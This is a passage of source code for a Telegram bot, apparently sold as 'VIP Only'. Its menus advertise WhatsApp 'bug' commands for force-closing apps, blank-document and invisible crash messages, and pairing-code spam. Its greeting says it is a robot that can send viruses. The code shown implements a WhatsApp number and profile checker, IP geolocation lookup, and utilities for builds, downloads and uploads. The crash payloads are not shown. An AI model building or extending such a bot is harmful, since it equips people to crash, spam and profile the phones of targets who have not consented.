            "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。"
        ) {
            await ctx.answerCbQuery();
        }
    }
});


// ===== BUG MENU PAGE 2 =====
bot.action('/bug_next', async (ctx) => {

    const runtimeStatus = formatRuntime();
    
    const bugMenu2 = `
<blockquote>╭━( 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 )
┃ ⌑ クリエイター : @Rafaelanjay1
┃ ⌑ バージョン : 1.0
┃ ⌑ ステータス : Vip Only
┃ ⌑ ランタイム : ${runtimeStatus}
╰━━━━━━━━━━━━━━━━━━⭓
╭━( 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂 )
┃ ⌑ /combo - Nusuk Jantung 
┃ ⌑ /xdel - Forclose Spam X Invis
┃ ⌑ /xdocu - Blank Document
┃ ⌑ /xnew - Blank 5 Msg Andro
┃ ⌑ /xnew2 - Segera Datang
╰━━━━━━━━━━━━━━━━━━⭓
</blockquote>`;

    const keyboard = [
        [
            { text: "⌜𝐁𝐚𝐜𝐤 ✘⌟", callback_data: "/bug" }
        ],
        [
            { text: "⌜𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮 ✘⌟", callback_data: "/start" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu2, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description ===
            "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。"
        ) {
            await ctx.answerCbQuery();
        }
    }
});

bot.action('/tools', async (ctx) => {

    const runtimeStatus = formatRuntime();
    
    const toolsMenu = `
こんにちは、${ctx.from.first_name}。私はウイルスを送信できるロボットです。できるだけ私を活用してください。

<blockquote>╭━( 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 )
┃ ⌑ クリエイター : @Rafaelanjay1
┃ ⌑ バージョン : 1.0
┃ ⌑ ステータス : Vip Only
┃ ⌑ ランタイム : ${runtimeStatus}
╰━━━━━━━━━━━━━━━━━━⭓
╭━( 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 )
┃ ⌑ /trackip - Searching for IP Information
┃ ⌑ /cekwa - Kontroleer WhatsApp-status  
┃ ⌑ /web2apk - Web To Apk
┃ ⌑ /tourl - Replay Ke Foto
┃ ⌑ /hd Mencerahkan Gambar 
┃ ⌑ /fixerror Replay Ke Code Yg Eror
┃ ⌑ /build - Build Fluter
┃ ⌑ /buildstatus - Mengecek Status Build
┃ ⌑ /play - Mencari Music
┃ ⌑ /ytplay - Download Audio Yt
┃ ⌑ /kodepos - Mengecek Kode Pos
┃ ⌑ /translate 
┃ ⌑ /tiktok - Download Tanpa Watermark 
┃ ⌑ /testfunction - Test your Function
┃ ⌑ /xpair - Spam Pairing Code
╰━━━━━━━━━━━━━━━━━━⭓
</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮 ✘⌟",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
こんにちは、${ctx.from.first_name}。私はウイルスを送信できるロボットです。できるだけ私を活用してください。

<blockquote>⌑╭━( 𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 )
┃ ⌑ @Rafaelanjay1 - The Devoloper
┃ ⌑ @kenzoplerr - Dajjal 
┃ ⌑ @Otapengenkawin - Support 
┃ ⌑ @JustinOffc - Support
╰━━━━━━━━━━━━━━━━━━⭓
</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮 ✘⌟",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {   
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

const XBUILD_API = "https://web2app.joomods.web.id/api/xbuild";
const XBUILD_RESULT_API = "https://web2app.joomods.web.id/api/result";
const XBUILD_APIKEY = "FastBuild";

const XBUILD_DB_PATH = path.join(process.cwd(), "data", "xbuild-jobs.json");
const XBUILD_ESTIMATE_MS = 20 * 60 * 1000; // estimasi 20 menit

if (!global.xbuildCheckerStarted) global.xbuildCheckerStarted = false;

function ensureXBuildDb() {
  const dir = path.dirname(XBUILD_DB_PATH);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });

  if (!fs.existsSync(XBUILD_DB_PATH)) {
    fs.writeFileSync(XBUILD_DB_PATH, JSON.stringify({ jobs: {} }, null, 2), "utf8");
  }
}

function readXBuildDb() {
  ensureXBuildDb();
  try {
    return JSON.parse(fs.readFileSync(XBUILD_DB_PATH, "utf8"));
  } catch {
    return { jobs: {} };
  }
}

function saveXBuildDb(db) {
  ensureXBuildDb();
  fs.writeFileSync(XBUILD_DB_PATH, JSON.stringify(db, null, 2), "utf8");
}

function safeFileName(name = "app") {
  return String(name)
    .replace(/[^\w\s.-]/g, "")
    .trim()
    .replace(/\s+/g, "_") || "app";
}

function formatEstimate(ms) {
  ms = Math.max(0, Number(ms) || 0);

  const totalSeconds = Math.floor(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes <= 0) return `${seconds} detik`;
  return `${minutes} menit ${seconds} detik`;
}

function getBuildEta(job) {
  const createdAt = Number(job?.createdAt || Date.now());
  const elapsed = Date.now() - createdAt;
  const remaining = XBUILD_ESTIMATE_MS - elapsed;

  return {
    elapsed,
    remaining: Math.max(0, remaining),
    etaText: remaining <= 0
      ? "Sebentar lagi / cek ulang beberapa menit lagi"
      : formatEstimate(remaining)
  };
}

function extractJobId(data) {
  return (
    data?.jobId ||
    data?.id ||
    data?.result?.jobId ||
    data?.result?.id ||
    data?.data?.jobId ||
    data?.data?.id ||
    null
  );
}

function extractBuildStatus(data) {
  return String(
    data?.status ||
    data?.message ||
    data?.msg ||
    data?.result?.status ||
    data?.data?.status ||
    "unknown"
  );
}

function extractBuildFiles(data) {
  const result = data?.result || data?.data || data || {};

  const apk =
    result.apk ||
    result.android ||
    result.download_android ||
    result.android_url ||
    result.url_apk ||
    result.downloadApk ||
    data?.apk ||
    data?.android ||
    null;

  const ipa =
    result.ipa ||
    result.ios ||
    result.download_ios ||
    result.ios_url ||
    result.url_ipa ||
    result.downloadIpa ||
    data?.ipa ||
    data?.ios ||
    null;

  return { apk, ipa };
}

function isStillBuilding(statusText = "") {
  const s = String(statusText).toLowerCase();
  return (
    s.includes("building") ||
    s.includes("process") ||
    s.includes("queue") ||
    s.includes("pending") ||
    s.includes("running") ||
    s.includes("progress")
  );
}

async function downloadBuffer(url) {
  const res = await axios.get(url, {
    responseType: "arraybuffer",
    timeout: 300000,
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
    validateStatus: () => true,
    headers: {
      "User-Agent": "Mozilla/5.0",
      Accept: "*/*"
    }
  });

  if (res.status !== 200) {
    throw new Error(`Download gagal. Status: ${res.status}`);
  }

  const buffer = Buffer.from(res.data);

  if (!buffer || buffer.length < 1000) {
    throw new Error("File terlalu kecil / tidak valid.");
  }

  return buffer;
}

async function sendBuildFile(bot, chatId, fileUrl, filename, caption) {
  const buffer = await downloadBuffer(fileUrl);

  return bot.telegram.sendDocument(
    chatId,
    {
      source: buffer,
      filename
    },
    {
      caption,
      disable_web_page_preview: true
    }
  );
}

async function checkBuildResult(jobId) {
  const { data, status } = await axios.get(XBUILD_RESULT_API, {
    params: { jobId },
    timeout: 120000,
    validateStatus: () => true,
    headers: {
      Accept: "application/json",
      "User-Agent": "Mozilla/5.0"
    }
  });

  console.log("XBUILD RESULT STATUS:", status);
  console.log("XBUILD RESULT RESPONSE:", data);

  return { data, status };
}

function startXBuildAutoChecker(bot) {
  if (global.xbuildCheckerStarted) return;
  global.xbuildCheckerStarted = true;

  setInterval(async () => {
    const db = readXBuildDb();
    const jobs = db.jobs || {};
    let changed = false;

    for (const jobId of Object.keys(jobs)) {
      const job = jobs[jobId];

      if (!job || job.done) continue;

      const age = Date.now() - Number(job.createdAt || Date.now());
      const maxAge = 40 * 60 * 1000;

      if (age > maxAge) {
        job.done = true;
        job.status = "timeout";
        changed = true;

        try {
          await bot.telegram.sendMessage(
            job.chatId,
            `⚠️ Build timeout.\n\n` +
            `🆔 ID: ${jobId}\n` +
            `Build terlalu lama.\n\n` +
            `Coba cek manual:\n/buildstatus ${jobId}`
          );
        } catch {}
        continue;
      }

      try {
        const { data, status } = await checkBuildResult(jobId);

        if (status !== 200 || !data) continue;

        const statusText = extractBuildStatus(data);
        const files = extractBuildFiles(data);
        const eta = getBuildEta(job);

        job.lastStatus = statusText;
        job.lastCheckAt = Date.now();

        if (isStillBuilding(statusText) && !files.apk && !files.ipa) {
          changed = true;
          continue;
        }

        if (!files.apk && !files.ipa) {
          changed = true;
          continue;
        }

        const appName = safeFileName(job.appName || `build_${jobId}`);

        let sentApk = false;
        let sentIpa = false;

        await bot.telegram.sendMessage(
          job.chatId,
          `✅ Build selesai!\n\n` +
          `🆔 ID: ${jobId}\n` +
          `📌 Status terakhir: ${statusText}\n` +
          `⏱️ Waktu proses: ${formatEstimate(eta.elapsed)}\n\n` +
          `📥 Sedang mengirim file hasil build...`
        );

        if (files.apk) {
          try {
            await sendBuildFile(
              bot,
              job.chatId,
              files.apk,
              `${appName}.apk`,
              `✅ Android APK berhasil dibuat\n\n🆔 ID: ${jobId}`
            );
            sentApk = true;
          } catch (e) {
            console.log("SEND APK ERROR:", e.message);
          }
        }

        if (files.ipa) {
          try {
            await sendBuildFile(
              bot,
              job.chatId,
              files.ipa,
              `${appName}.ipa`,
              `✅ iOS IPA berhasil dibuat\n\n🆔 ID: ${jobId}`
            );
            sentIpa = true;
          } catch (e) {
            console.log("SEND IPA ERROR:", e.message);
          }
        }

        job.done = true;
        job.status = "completed";
        job.completedAt = Date.now();
        job.sentApk = sentApk;
        job.sentIpa = sentIpa;
        changed = true;

        await bot.telegram.sendMessage(
          job.chatId,
          `📦 Build report\n\n` +
          `🆔 ID: ${jobId}\n` +
          `🤖 APK: ${sentApk ? "terkirim" : "gagal"}\n` +
          `🍏 IPA: ${sentIpa ? "terkirim" : "gagal"}`
        );

      } catch (err) {
        console.log("AUTO XBUILD CHECK ERROR:", err.message);
      }
    }

    if (changed) saveXBuildDb(db);
  }, 60 * 1000);
}

startXBuildAutoChecker(bot);

bot.command(["build", "xbuild"], async (ctx) => {
  try {
    const input = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

    if (!input) {
      return ctx.reply(
        "❌ Format salah.\n\n" +
        "Contoh:\n" +
        "/build https://files.catbox.moe/ijbgix.zip\n\n" +
        "Usahakan ZIP Flutter dari Catbox."
      );
    }

    const zipUrl = input.split(" ")[0].trim();

    if (!/^https?:\/\//i.test(zipUrl)) {
      return ctx.reply("❌ URL ZIP harus diawali http:// atau https://");
    }

    if (!/\.zip(\?.*)?$/i.test(zipUrl)) {
      return ctx.reply("❌ File harus berupa link .zip");
    }

    await ctx.reply(
      `⏳ BUILD STARTED\n\n` +
      `Build Flutter memang bisa lama.\n` +
      `Estimasi normal: 10–20 menit.\n\n` +
      `Bot akan auto cek dan kirim hasil kalau sudah selesai.`
    );

    const { data, status } = await axios.get(XBUILD_API, {
      params: {
        apikey: XBUILD_APIKEY,
        zipUrl
      },
      timeout: 180000,
      validateStatus: () => true,
      headers: {
        Accept: "application/json",
        "User-Agent": "Mozilla/5.0"
      }
    });

    console.log("XBUILD STATUS:", status);
    console.log("XBUILD RESPONSE:", data);

    if (status !== 200 || !data) {
      return ctx.reply(`❌ API error.\nStatus: ${status}`);
    }

    const success = data?.success ?? data?.status ?? true;
    if (success === false) {
      return ctx.reply(
        `❌ Build gagal dimulai.\n\n` +
        `Info: ${data?.message || data?.msg || "Tidak diketahui"}`
      );
    }

    const jobId = extractJobId(data);

    if (!jobId) {
      return ctx.reply(
        "❌ Job ID tidak ditemukan dari API.\nCek console XBUILD RESPONSE."
      );
    }

    const db = readXBuildDb();

    db.jobs[String(jobId)] = {
      jobId: String(jobId),
      chatId: ctx.chat.id,
      userId: ctx.from.id,
      username: ctx.from.username || "",
      zipUrl,
      appName: `build_${jobId}`,
      status: "building",
      done: false,
      createdAt: Date.now(),
      lastStatus: extractBuildStatus(data)
    };

    saveXBuildDb(db);

    return ctx.reply(
      `✅ BUILD STARTED\n\n` +
      `□ Plan: ${data?.plan || data?.result?.plan || "Premium"}\n` +
      `□ Remaining: ${data?.remaining || data?.result?.remaining || "unlimited"}\n` +
      `□ ID: ${jobId}\n` +
      `□ Estimasi: 10–20 menit\n\n` +
      `Cek manual:\n/buildstatus ${jobId}\n\n` +
      `Bot akan auto kirim APK/IPA kalau build sudah selesai.`
    );

  } catch (err) {
    console.error("XBUILD ERROR:", err.response?.data || err.message || err);
    return ctx.reply("❌ Terjadi kesalahan saat memulai build.");
  }
});

bot.command("buildstatus", async (ctx) => {
  try {
    const jobId = (ctx.message.text || "").split(" ")[1]?.trim();

    if (!jobId) {
      return ctx.reply("❌ Contoh:\n/buildstatus 1777189141187");
    }

    await ctx.reply("🔎 Mengecek status build...");

    const { data, status } = await checkBuildResult(jobId);

    if (status !== 200 || !data) {
      return ctx.reply(`❌ Gagal cek build.\nStatus: ${status}`);
    }

    const statusText = extractBuildStatus(data);
    const files = extractBuildFiles(data);

    const db = readXBuildDb();
    const job = db.jobs?.[String(jobId)];
    const eta = job ? getBuildEta(job) : null;

    if (isStillBuilding(statusText) && !files.apk && !files.ipa) {
      return ctx.reply(
        `⏳ Build masih diproses...\n\n` +
        `🆔 ID: ${jobId}\n` +
        `📌 Status: ${statusText}\n` +
        `⏱️ Estimasi terkirim: ${eta ? eta.etaText : "Tidak diketahui"}\n\n` +
        `Build biasanya memakan waktu 10–20 menit.`
      );
    }

    if (!files.apk && !files.ipa) {
      return ctx.reply(
        `⚠️ Build belum punya file hasil.\n\n` +
        `🆔 ID: ${jobId}\n` +
        `📌 Status: ${statusText}\n` +
        `⏱️ Estimasi terkirim: ${eta ? eta.etaText : "Tidak diketahui"}`
      );
    }

    await ctx.reply(
      `✅ Build selesai.\n\n` +
      `🆔 ID: ${jobId}\n` +
      `📌 Status: ${statusText}\n` +
      `⏱️ Lama proses: ${eta ? formatEstimate(eta.elapsed) : "Tidak diketahui"}\n\n` +
      `📥 Sedang mengirim file...`
    );

    const appName = safeFileName(`build_${jobId}`);

    let sentApk = false;
    let sentIpa = false;

    if (files.apk) {
      try {
        await sendBuildFile(
          bot,
          ctx.chat.id,
          files.apk,
          `${appName}.apk`,
          `✅ Android APK berhasil dibuat\n\n🆔 ID: ${jobId}`
        );
        sentApk = true;
      } catch (e) {
        console.log("MANUAL SEND APK ERROR:", e.message);
      }
    }

    if (files.ipa) {
      try {
        await sendBuildFile(
          bot,
          ctx.chat.id,
          files.ipa,
          `${appName}.ipa`,
          `✅ iOS IPA berhasil dibuat\n\n🆔 ID: ${jobId}`
        );
        sentIpa = true;
      } catch (e) {
        console.log("MANUAL SEND IPA ERROR:", e.message);
      }
    }

    if (job) {
      job.done = true;
      job.status = "completed";
      job.completedAt = Date.now();
      job.sentApk = sentApk;
      job.sentIpa = sentIpa;
      saveXBuildDb(db);
    }

    return ctx.reply(
      `📦 Build report\n\n` +
      `🆔 ID: ${jobId}\n` +
      `🤖 APK: ${sentApk ? "terkirim" : "gagal/tidak ada"}\n` +
      `🍏 IPA: ${sentIpa ? "terkirim" : "gagal/tidak ada"}`
    );

  } catch (err) {
    console.error("BUILDSTATUS ERROR:", err.response?.data || err.message || err);
    return ctx.reply("❌ Terjadi kesalahan saat cek build.");
  }
});

bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ IP: ${data.ip || "-"}
⌑ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⌑ Region: ${data.region || "-"}
⌑ City: ${data.city || "-"}
⌑ ZIP: ${data.postal || "-"}
⌑ Timezone: ${data.timezone_gmt || "-"}
⌑ ISP: ${data.isp || "-"}
⌑ Org: ${data.org || "-"}
⌑ ASN: ${data.asn || "-"}
⌑ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

const delay = (ms) => new Promise(res => setTimeout(res, ms));

async function ultraRealChecker(sock, number) {
    try {
        const clean = number.replace(/[^0-9]/g, "");
        const jid = clean + "@s.whatsapp.net";

        // 1️⃣ cek terdaftar
        const reg = await sock.onWhatsApp(jid);

        if (!reg || reg.length === 0) {
            return {
                status: "❌ NOT REGISTERED",
                banned: "—",
                business: "—",
                verified: "—",
                note: "Nomor tidak ada di WhatsApp"
            };
        }

        // 2️⃣ cek business info
        let business = "Personal";
        let verified = "Unknown";

        try {
            const biz = await sock.getBusinessProfile(jid);

            if (biz) {
                business = "Business Account";
                // estimasi verified (tidak resmi)
                if (biz.description || biz.website) {
                    verified = "Possible Verified 🟢";
                }
            }
        } catch {}

        // 3️⃣ cek profile picture (indikasi akun aktif)
        let privacy = "PRIVATE";
        try {
            await sock.profilePictureUrl(jid, "image");
            privacy = "OPEN";
        } catch {}

        return {
            status: "✅ REGISTERED",
            banned: "Not detected",
            business,
            verified,
            privacy,
            note: "Akun aktif (indikasi normal)"
        };

    } catch {
        return {
            status: "⚠️ UNKNOWN",
            banned: "Possible restricted",
            business: "?",
            verified: "?",
            privacy: "?",
            note: "Server menolak request (indikasi limit/restricted)"
        };
    }
}

function escapeMarkdown(text = "") {
  const backtick = String.fromCharCode(96);

  return String(text)
    .replace(/[_*\[\]()~>#+\-=|{}.!]/g, "\\$&")
    .split(backtick)
    .join("\\" + backtick);
}

bot.command("ytplay", async (ctx) => {
  try {
    const url = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

    if (!url) {
      return ctx.reply(
        "❌ Masukkan link YouTube.\n\n" +
        "Contoh:\n" +
        "/ytplay https://youtu.be/bKmA9rDsJlY"
      );
    }

    if (!/^https?:\/\/(www\.)?(youtube\.com|youtu\.be)\//i.test(url)) {
      return ctx.reply("❌ Link YouTube tidak valid.");
    }

    await ctx.reply("⏳ Sedang mengambil audio YouTube...");

    const { data, status } = await axios.get("https://api.ikyyxd.my.id/download/ytmp3", {
      params: { url },
      timeout: 180000,
      validateStatus: () => true,
      headers: {
        Accept: "application/json",
        "User-Agent": "Mozilla/5.0"
      }
    });

    console.log("YTMP3 STATUS:", status);
    console.log("YTMP3 RESPONSE:", data);

    if (status !== 200 || !data) {
      return ctx.reply(`❌ API error.\nStatus: ${status}`);
    }

    if (!data.status || !data.result) {
      return ctx.reply("❌ Gagal mengambil audio dari API.");
    }

    const result = data.result;

    const title = result.title || "YouTube Audio";
    const thumbnail = result.thumbnail || null;
    const duration = result.duration || "-";
    const audioQuality = result.audio?.quality || "-";
    const audioUrl = result.audio?.url || null;

    if (!audioUrl) {
      return ctx.reply("❌ Link audio tidak ditemukan dari API.");
    }

    const durationText =
      typeof duration === "number"
        ? `${Math.floor(duration / 60)} menit ${duration % 60} detik`
        : duration;

    const caption =
      `🎵 *YouTube MP3*\n\n` +
      `📌 Judul: ${escapeMarkdown(title)}\n` +
      `⏱️ Durasi: ${durationText}\n` +
      `🎧 Quality: ${audioQuality}\n\n` +
      `📥 Sedang mengirim audio...`;

    if (thumbnail) {
      await ctx.replyWithPhoto(
        { url: thumbnail },
        {
          caption,
          parse_mode: "Markdown"
        }
      ).catch(() => {});
    } else {
      await ctx.reply(caption, { parse_mode: "Markdown" }).catch(() => {});
    }

    const safeTitle = String(title)
      .replace(/[^\w\s-]/g, "")
      .trim()
      .replace(/\s+/g, "_") || "ytmp3_audio";

    try {
      return await ctx.replyWithAudio(
        {
          url: audioUrl,
          filename: `${safeTitle}.mp3`
        },
        {
          caption:
            `✅ Audio berhasil dikirim\n\n` +
            `🎵 ${title}\n` +
            `🎧 ${audioQuality}`,
          title: title,
          performer: "YouTube"
        }
      );
    } catch (audioErr) {
      console.error("SEND AUDIO URL ERROR:", audioErr.message);

      try {
        return await ctx.replyWithDocument(
          {
            url: audioUrl,
            filename: `${safeTitle}.mp3`
          },
          {
            caption:
              `✅ Audio dikirim sebagai file\n\n` +
              `🎵 ${title}\n` +
              `🎧 ${audioQuality}`
          }
        );
      } catch (docErr) {
        console.error("SEND DOCUMENT URL ERROR:", docErr.message);

        return ctx.reply(
          `⚠️ Audio berhasil dibuat, tapi Telegram gagal mengirim file karena terlalu besar/lama.\n\n` +
          `🎵 Judul: ${title}\n` +
          `⏱️ Durasi: ${durationText}\n` +
          `🎧 Quality: ${audioQuality}\n\n` +
          `🔗 Link audio:\n${audioUrl}`,
          {
            disable_web_page_preview: true
          }
        );
      }
    }

  } catch (err) {
    console.error("YTMP3 ERROR:", err.response?.data || err.message || err);
    return ctx.reply(
      `❌ Terjadi kesalahan saat memproses YouTube MP3.\n\n` +
      `${err.message || err}`
    );
  }
});

bot.command('hd', async (ctx) => {
    const quotedMsg = ctx.message.reply_to_message;
    if (!quotedMsg || !quotedMsg.photo) {
        return ctx.reply("❌ reply foto yang mau dibikin HD jir");
    }

    try {
        await ctx.reply("⏳ Tunggu Sebentar....");

        const photo = quotedMsg.photo[quotedMsg.photo.length - 1];
        const fileId = photo.file_id;
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const apiUrl = `https://api.ikyyxd.my.id/tools/upscale?url=${encodeURIComponent(fileLink.href)}`;
        const response = await axios.get(apiUrl);

        if (response.data.status && response.data.result) {
            const hdImage = response.data.result.image;
            const size = response.data.result.size;

            await ctx.replyWithPhoto(hdImage, {
                caption: `✅ **Berhasil di-Upscale!**\n📦 **Size**: ${size}`,
                parse_mode: 'Markdown',
                reply_to_message_id: ctx.message.message_id
            });
        } else {
            ctx.reply("❌ Gagal memproses gambar.");
        }

    } catch (e) {
        console.error("Error Upscale:", e);
        ctx.reply(`❌ Terjadi kesalahan: ${e.message}`);
    }
});

const uploadCache = {};

bot.command("tourl", async (ctx) => {
  const message = ctx.message.reply_to_message;
  const userId = String(ctx.from.id);

  if (!message || (!message.photo && !message.video && !message.document)) {
    return ctx.reply("❌ Silakan reply foto/video/file dengan command /tourl", {
      reply_to_message_id: ctx.message.message_id
    });
  }

  let fileId = null;

  if (message.photo) {
    fileId = message.photo[message.photo.length - 1].file_id;
  } else if (message.video) {
    fileId = message.video.file_id;
  } else if (message.document) {
    fileId = message.document.file_id;
  }

  uploadCache[userId] = fileId;

  return ctx.reply("🌐 Pilih Host Upload:", {
    reply_to_message_id: ctx.message.message_id,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "📦 Catbox", callback_data: "upl_catbox" },
          { text: "💧 Uguu", callback_data: "upl_uguu" }
        ],
        [
          { text: "🚀 Ikyy CDN", callback_data: "upl_cdn" }
        ]
      ]
    }
  });
});

bot.action(/^upl_(catbox|uguu|cdn)$/, async (ctx) => {
  const host = ctx.match[1];
  const userId = String(ctx.from.id);
  const fileId = uploadCache[userId];

  if (!fileId) {
    return ctx.answerCbQuery("❌ Sesi kadaluarsa!", {
      show_alert: true
    });
  }

  try {
    await ctx.answerCbQuery(`Mengunggah ke ${host}...`);

    await ctx.editMessageText(
      `⏳ Memproses file untuk ${host.toUpperCase()}...`
    );

    const fileLink = await ctx.telegram.getFileLink(fileId);

    const responseFile = await axios.get(fileLink.href, {
      responseType: "stream",
      timeout: 120000,
      headers: {
        "User-Agent": "Mozilla/5.0"
      }
    });

    const fileName =
      fileLink.href.split("/").pop()?.split("?")[0] ||
      `upload_${Date.now()}`;

    const form = new FormData();

    form.append("file", responseFile.data, {
      filename: fileName
    });

    const { data, status } = await axios.post(
      `https://api.ikyyxd.my.id/uploads?host=${encodeURIComponent(host)}`,
      form,
      {
        headers: {
          ...form.getHeaders()
        },
        timeout: 180000,
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        validateStatus: () => true
      }
    );

    console.log("TOURL STATUS:", status);
    console.log("TOURL RESPONSE:", data);

    if (status !== 200 || !data) {
      throw new Error(`API error. Status: ${status}`);
    }

    if (!data.status) {
      throw new Error(data.error || data.message || "API respon gagal");
    }

    let finalUrl = "";

    if (host === "catbox") {
      finalUrl = data.result;
    } else if (host === "uguu") {
      finalUrl =
        data.result?.files?.[0]?.url ||
        data.result?.url ||
        data.url ||
        "";
    } else if (host === "cdn") {
      finalUrl =
        data.result?.url ||
        data.result ||
        data.url ||
        "";
    }

    if (!finalUrl || typeof finalUrl !== "string") {
      throw new Error("URL hasil upload tidak ditemukan dari API.");
    }

    delete uploadCache[userId];

    return ctx.editMessageText(
      `✅ Berhasil Diupload!\n\n` +
      `🌐 Host: ${host.toUpperCase()}\n` +
      `🔗 URL:\n${finalUrl}`,
      {
        disable_web_page_preview: true,
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🔗 Buka Link", url: finalUrl }
            ]
          ]
        }
      }
    );

  } catch (err) {
    console.error("TOURL ERROR:", err.response?.data || err.message || err);

    const errMsg =
      err.response?.data?.error ||
      err.response?.data?.message ||
      err.message ||
      "Tidak diketahui";

    return ctx.editMessageText(
      `❌ Gagal upload.\n\n` +
      `📌 Error: ${errMsg}`
    );
  }
});

bot.command("fixerror", async (ctx) => {
  try {
    let text = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

    if (!text && ctx.message.reply_to_message) {
      text =
        ctx.message.reply_to_message.text ||
        ctx.message.reply_to_message.caption ||
        "";
    }

    if (!text) {
      return ctx.reply(
        "❌ Masukkan kode/error yang mau diperbaiki.\n\n" +
        "Contoh:\n" +
        "/fixerror bot.command('hd', async (ctx) => { ... })\n\n" +
        "Atau reply pesan kode lalu ketik:\n" +
        "/fixerror"
      );
    }

    await ctx.reply("🛠️ Sedang memperbaiki error...");

